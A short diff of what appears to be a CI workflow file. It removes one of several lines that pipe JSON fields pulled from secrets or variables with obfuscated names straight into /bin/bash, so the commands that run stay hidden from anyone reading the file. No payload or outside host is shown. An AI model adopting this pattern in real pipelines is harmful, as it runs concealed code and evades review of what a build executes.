@@ -19,7 +19,6 @@ jobs:
           p74: ${{ secrets.p74 }}
         run: |
           printf '%s' "$p74" | jq -r .bvm5 | /bin/bash
-          echo $f912 | jq -r .hheav17 | /bin/bash
           printf '%s' "$hug16758" | jq -r .aljn9960 | /bin/bash
           echo $z8 | jq -r .ere5 | /bin/bash
 
